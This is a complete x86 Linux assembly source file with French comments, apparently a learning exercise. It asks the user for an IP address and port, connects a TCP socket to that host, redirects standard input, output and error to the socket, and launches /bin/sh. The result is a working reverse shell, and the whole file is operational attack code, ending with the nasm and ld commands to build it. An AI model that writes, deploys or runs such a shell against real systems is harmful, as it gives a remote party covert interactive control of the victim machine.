section .data
    ; IPV4 : domain=AF_INET (2)
    ; TCP : type=SOCK_STREAM (1)
    ; IP : protocol=TCP (0)

    socket_args     dd 2, 1,  0

    msg_ip          db "Quelle est l'ip ?", 0xA     ; Message avec saut de ligne
    msg_ip_len      equ $ - msg_ip                  ; Calcul de la longueur du message

    msg_port        db "Quel est le port ?", 0xA    ; Message avec saut de ligne
    msg_port_len    equ $ - msg_port                ; Calcul de la longueur du message

    invalid_ip_msg db "IP invalide. Réessayez.", 0xA
    invalid_ip_msg_len equ $ - invalid_ip_msg



section .bss
    ip_input        resb 20     ; Buffer pour l'ip users
    port_input      resb 6      ; Buffer pour le port
    sockaddre_in    resb 16     ; Structure pour connect

section .text
    global _start


_start:

    ;----------------------------------------------------------------------------
    ;-                                  IP                                      -
    ;----------------------------------------------------------------------------

read_ip:
    ; Affiche "Quelle est l'ip ?"
    mov eax, 4                      ; syscall --> write
    mov ebx, 1                      ; stdout --> sortie standard
    mov ecx, msg_ip                 ; Pointeur vers le message
    mov edx, msg_ip_len             ; Longueur du message
    int 0x80                        ; Lance le syscall

    ; Lit l'entrée utilisateur dans ip_input
    mov eax, 3                      ; syscall --> read
    mov ebx, 0                      ; stdin --> entrée clavier
    mov ecx, ip_input               ; Zone mémoire pour stocker l'entrée utilisateur
    mov edx, 20                     ; Taille maximale à lire
    int 0x80                        ; Lance le syscall

    ; Initialisations
    lea esi, [ip_input]             ; Pointeur vers le buffer de l'IP
    lea edi, [sockaddre_in + 4]     ; Pointeur vers la structure sockaddr_in pour l'IP
    xor ecx, ecx                    ; Réinitialise le compteur d'octets
    xor edx, edx                    ; Réinitialise le compteur de points

.parse_octet:
    xor eax, eax                    ; Réinitialise la valeur numérique de l'octet

.parse_digit:
    mov bl, [esi]                   ; Charge un caractère de l'entrée utilisateur
    cmp bl, 10                      ; Vérifie si c'est un saut de ligne
    je .check_final_octet           ; Si oui, vérifie le dernier octet

    cmp bl, '.'                     ; Vérifie si c'est un point
    je .store_octet                 ; Si oui, stocke l'octet

    cmp bl, '0'                     ; Vérifie si le caractère est inférieur à '0'
    jb .invalid_ip                  ; Si oui, IP invalide
    cmp bl, '9'                     ; Vérifie si le caractère est supérieur à '9'
    ja .invalid_ip                  ; Si oui, IP invalide

    sub bl, '0'                     ; Convertit le caractère ASCII en valeur numérique
    imul eax, eax, 10               ; Multiplie la valeur actuelle par 10
    add eax, ebx                    ; Ajoute la nouvelle valeur
    cmp eax, 255                    ; Vérifie si la valeur dépasse 255
    ja .invalid_ip                  ; Si oui, IP invalide

    inc esi                         ; Passe au caractère suivant
    jmp .parse_digit                ; Continue la boucle pour le prochain chiffre

.store_octet:
    mov [edi], al                   ; Stocke l'octet converti dans la structure sockaddr_in
    inc edi                         ; Passe à l'octet suivant
    inc esi                         ; Passe au caractère suivant
    inc ecx                         ; Incrémente le compteur d'octets
    inc edx                         ; Incrémente le compteur de points
    cmp edx, 3                      ; Vérifie si plus de 3 points
    ja .invalid_ip                  ; Si oui, IP invalide
    jmp .parse_octet                ; Continue la boucle pour le prochain octet

.check_final_octet:
    mov [edi], al                   ; Stocke le dernier octet dans la structure sockaddr_in
    inc ecx                         ; Incrémente le compteur d'octets
    cmp ecx, 4                      ; Vérifie si exactement 4 octets
    jne .invalid_ip                 ; Si non, IP invalide
    jmp .ip_ok                      ; Sinon, IP valide

.invalid_ip:
    ; Affiche "IP invalide. Réessayez."
    mov eax, 4                      ; syscall --> write
    mov ebx, 1                      ; stdout --> sortie standard
    mov ecx, invalid_ip_msg         ; Pointeur vers le message d'erreur
    mov edx, invalid_ip_msg_len     ; Longueur du message d'erreur
    int 0x80                        ; Lance le syscall
    jmp read_ip                     ; Redemande l'IP

.ip_ok:
    ; IP OK - on continue


    ;----------------------------------------------------------------------------
    ;-                                 PORT                                     -
    ;----------------------------------------------------------------------------

    ; Message demande du Port
    mov eax, 4              ; syscall --> write pour afficher un message
    mov ebx, 1              ; stdout --> sortie standard
    mov ecx, msg_port       ; Pointeur vers le message
    mov edx, msg_port_len   ; Longueur du message
    int 0x80                ; Lance

    ; Récupération Port 
    mov eax, 3              ; syscall --> read pour lire l'entré Utilisateur
    mov ebx, 0              ; stdin --> Entré clavier
    mov ecx, port_input     ; Zone mémoire ou stocké l'entrée utilisateur
    mov edx, 6              ; Max d'octet a lire
    int 0x80                ; Lance

    ; Conversion du port en hexadecimal
    xor eax, eax            ; Réinitialise eax
    xor ebx, ebx            ; Réinitialise ebx
    mov ecx, port_input     ; Pointeur vers le buffer du port


convert_loop:
    movzx edx, byte [ecx]   ; Charge un octet du buffer
    cmp dl, 0x0A            ; Vérifie si c'est un saut de ligne (fin de l'entrée)
    je convert_done         ; Si oui, termine la conversion
    sub dl, '0'             ; Convertit le caractère ASCII en valeur numérique
    imul eax, eax, 10       ; Multiplie la valeur actuelle par 10
    add eax, edx            ; Ajoute la nouvelle valeur
    inc ecx                 ; Passe au caractère suivant
    jmp convert_loop        ; Continue la boucle

convert_done:
    xchg ax, ax                     ; Instruction NOP (aucun effet réel, peut être ignorée)
    mov bx, ax                      ; Copie la valeur de ax (port) dans bx
    rol bx, 8                       ; Inverse les octets pour respecter l'ordre réseau (big-endian)
    mov [sockaddre_in + 2], bx      ; Place le port converti dans la structure sockaddr_in

    mov word [sockaddre_in], 2       ; AF_INET
    xor eax, eax
    mov dword [sockaddre_in + 8], eax
    mov dword [sockaddre_in + 12], eax


    ;----------------------------------------------------------------------------
    ;                     socket(AF_INET, SOCK_STREAM, 0)                       -
    ;----------------------------------------------------------------------------
    mov eax, 102            ; syscall --> socketcall
    mov ebx, 1              ; sous fonction de syscall --> socket()
    lea ecx, [socket_args]  ; Pointe vers mon arguments
    int 0x80                ; Lance

    mov esi, eax                    ; sauvegarder le FD

    ;----------------------------------------------------------------------------
    ;                        connect(sock, sockaddr*, 16)                       -
    ;----------------------------------------------------------------------------
    push 16
    lea ebx, [sockaddre_in]
    push ebx
    push esi
    mov eax, 102
    mov ebx, 3
    mov ecx, esp
    int 0x80

    ;----------------------------------------------------------------------------
    ;       dup2 pour rediriger stdin, stdout, stderr vers le socket            -
    ;                       dup2(sockfd, 0), (1), (2)                           -
    ;----------------------------------------------------------------------------
    mov ebx, esi
    xor ecx, ecx

.dup_loop:
    mov eax, 63
    int 0x80
    inc ecx
    cmp ecx, 3
    jne .dup_loop

    ;----------------------------------------------------------------------------
    ;                       execve("/bin/sh", NULL, NULL)                       -
    ;----------------------------------------------------------------------------
    xor eax, eax
    push eax
    push dword 0x68732f2f     ; "//sh"
    push dword 0x6e69622f     ; "/bin"
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov eax, 11
    int 0x80












;nasm -f elf32 reverseshell.asm -o reverse_shell.o
; ld -m elf_i386 reverse_shell.o -o reverse_shell
